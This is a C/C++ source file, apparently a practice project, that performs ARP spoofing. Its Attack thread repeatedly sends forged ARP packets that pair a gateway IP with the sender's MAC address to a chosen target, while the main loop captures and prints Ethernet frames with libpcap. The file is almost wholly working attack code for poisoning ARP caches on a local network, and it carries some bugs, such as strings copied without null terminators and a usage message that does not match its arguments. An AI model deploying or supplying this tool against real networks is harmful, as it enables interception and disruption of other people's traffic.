// sudo apt install libnet-dev

//#include <fstream>
#include <pthread.h>
#include "stdafx.h"

#define REQ_CNT 20

// ########## Define a struct for pthread parameters ##########
struct Parameter_Pthread{
  char* argv_1;
  char* argv_2;
  char* aIPaddr;
  char* aMACaddr;
};

// ########## Sending contaminated ARP packets ##########
// ########## Period : 2 sec ##########
void* Attack(void* info){
  struct Parameter_Pthread* PP = (struct Parameter_Pthread*)(info);
  struct in_addr src_in_addr, target_in_addr;
  ARP_header attack_packet;
  struct sockaddr sa;
  //char* recv_str;
  int sock;
  sock = socket(AF_INET, SOCK_PACKET, htons(ETH_P_RARP));
  if(sock<0){ perror("socket error"); exit(1); }

  attack_packet.tomar_ip_addr(&src_in_addr, PP->aIPaddr);
  attack_packet.tomar_ip_addr(&target_in_addr, PP->argv_1);
 attack_packet.tomar_mac_addr(attack_packet.Destination_mac_addr, PP->argv_2);
  attack_packet.tomar_mac_addr(attack_packet.target_mac_addr, PP->argv_2);
  attack_packet.tomar_mac_addr(attack_packet.src_mac_addr, PP->aMACaddr);
  attack_packet.tomar_mac_addr(attack_packet.sender_mac_addr, PP->aMACaddr);

  memcpy(attack_packet.sender_ip_addr, &src_in_addr, IP_ADDR_LEN);
  memcpy(attack_packet.target_ip_addr, &target_in_addr, IP_ADDR_LEN);

  bzero(attack_packet.padding, 18);
  strcpy(sa.sa_data, DEFAULT_DEVICE);

  while(1){
    printf("\n----------_ARP_----------\n");
    attack_packet.Print_ARP();
    if(sendto(sock, &attack_packet, sizeof(attack_packet), 0, &sa, sizeof(sa)) < 0){
        perror("sendto error");
        exit(1);
    }
    sleep(2);
  }
}

void Print_Data(const u_char* Packet_DATA){
  for(int i = 0; i < 10; i++) printf("%02x ", Packet_DATA[i]);
  printf("\n");
}

void usage() {
  printf("syntax: ARP_TEST <interface>\n");
  printf("sample: ARP_TEST %s\n", DEFAULT_DEVICE);
}

// ########## Define a function to elimate special character ##########
void delChar(char* buf, char* dest, char ch){
  int cnt = 0;
  for(int i = 0; buf[i] != 0; i++){
    if(buf[i] != ch){
      dest[cnt] = buf[i];
      cnt++;
    }
  }
  buf[cnt] = 0;
}

// ########## Define a function to insert zero ##########
void convert_mac(const char* data, char* cvrt_str, int s){
  char buf[128] = {0x00, };
  char t_buf[8];
  char* stp = strtok((char*)data, ":");
  int temp = 0;
  do{
    memset(t_buf, 0x0, sizeof(t_buf));
    sscanf(stp, "%x", &temp);
    snprintf(t_buf, sizeof(t_buf)-1, "%02x", temp);
    strncat(buf, t_buf, sizeof(buf)-1);
    strncat(buf, ":", sizeof(buf)-1);
  }
  while((stp = strtok(NULL, ":")) != NULL);
  buf[strlen(buf)-1] = '\0';
  strncpy(cvrt_str, buf, s);
}

int main(int argc, char* argv[]) {
  if (argc != 4) {
    usage();
    return -1;
  }

// ########## Make a file to write ##########
//  ofstream writeFile1("Result_text.txt");

// ########## Make a thread ##########
  pthread_t thread;
  int status = 0;

// ########## Make a struct variable to give several parameters to pthread ##########
  struct Parameter_Pthread pt;

// ########## Make a socket to find my IP & MAC address ##########
  int sockfd, req_cnt = REQ_CNT;
  char s_mac_addr[128] = {0x00, };

  struct sockaddr_in* sock;
  struct ifconf ifcnf_s;
  struct ifreq* ifr_s;

  sockfd = socket(PF_INET, SOCK_DGRAM, 0);
  if(sockfd < 0){
    perror("socket error");
    return -1;
  }

  memset((void*)&ifcnf_s, 0x0, sizeof(ifcnf_s));
  ifcnf_s.ifc_len = sizeof(struct ifreq) * req_cnt;
  ifcnf_s.ifc_buf = (char*)malloc(ifcnf_s.ifc_len);
  if(ioctl(sockfd, SIOCGIFCONF, (char*)&ifcnf_s) < 0){
    perror("icoctl - SIOCGIFCONF error");
    return -1;
  }

  if(ifcnf_s.ifc_len > (sizeof(struct ifreq) * req_cnt)){
    req_cnt = ifcnf_s.ifc_len;
    ifcnf_s.ifc_buf = (char*)realloc(ifcnf_s.ifc_buf, req_cnt);
  }

  ifr_s = ifcnf_s.ifc_req;
  for(int cnt = 0; cnt < ifcnf_s.ifc_len; cnt += sizeof(struct ifreq), ifr_s++){
    if(ioctl(sockfd, SIOCGIFFLAGS, ifr_s) < 0){
      perror("ioctl - SIOCGFFLAGS error");
      return -1;
    }

    if(ifr_s->ifr_flags & IFF_LOOPBACK) continue;
    sock = (struct sockaddr_in*)&ifr_s->ifr_addr;
    if(ioctl(sockfd, SIOCGIFHWADDR, ifr_s) < 0){
      perror("ioctl - SIOCGFHWADDR error");
      return -1;
    }
    convert_mac(ether_ntoa((struct ether_addr*)(ifr_s->ifr_hwaddr.sa_data)), s_mac_addr, sizeof(s_mac_addr)-1);
  }

  char* a_mac_addr = (char*)malloc(sizeof(s_mac_addr));
  if(a_mac_addr == NULL){ perror("a_mac_addr malloc error"); exit(1); }
  delChar((char*)s_mac_addr, a_mac_addr, ':');

// ########################################

// ########## Make a pcap environment ##########
  char dev[10] = "enp0s3";
  char errbuf[PCAP_ERRBUF_SIZE];
  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    return -1;
  }

// ########## Make contents of parameters ##########
  pt.argv_1 = (char*)malloc(strlen(argv[1]));
  if(pt.argv_1 == NULL){ perror("pt.argv_1 malloc error"); exit(1); }
  pt.argv_2 = (char*)malloc(strlen(argv[2]));
  if(pt.argv_2 == NULL){ perror("pt.argv_2 malloc error"); exit(1); }
  pt.aIPaddr = (char*)malloc(strlen(argv[3])); // gateway IP
  if(pt.aIPaddr == NULL){ perror("pt.aIPaddr malloc error"); exit(1); }
  pt.aMACaddr = (char*)malloc(strlen(a_mac_addr));
  if(pt.aMACaddr == NULL){ perror("pt.aMACaddr malloc error"); exit(1); }

  strncpy(pt.argv_1, argv[1], strlen(argv[1]));
  strncpy(pt.argv_2, argv[2], strlen(argv[2]));
  strncpy(pt.aIPaddr, argv[3], strlen(argv[3]));
  strncpy(pt.aMACaddr, a_mac_addr, strlen(a_mac_addr));

  if(pthread_create(&thread, NULL, Attack, (void*)&pt) < 0){
    perror("Thread create error"); exit(0);
  }

// ########## Receiving packets ##########
  while (true) {
    struct pcap_pkthdr* header;
    const u_char* packet;
    int res = pcap_next_ex(handle, &header, &packet);
    if (res == 0) continue;
    if (res == -1 || res == -2) break;

    printf("########################\n\n");
    printf("-- %u Bytes captured --\n\n", header->caplen);

    printf("-------_Ethernet_-------\n");
    uint8_t tmp = 0; // Ethernet header size
    Ethernet_header Eh;
    tmp = Eh.Print_Eth(packet);
    //printf("packet : %d\n", tmp);
    if(tmp > 14) break;
    packet += 14;
    printf("\n");

    if(packet){
      
    }
  }
  pthread_join(thread, (void**)&status);
  //printf("Thread %d\n", status);
  pcap_close(handle);
  return 0;
}





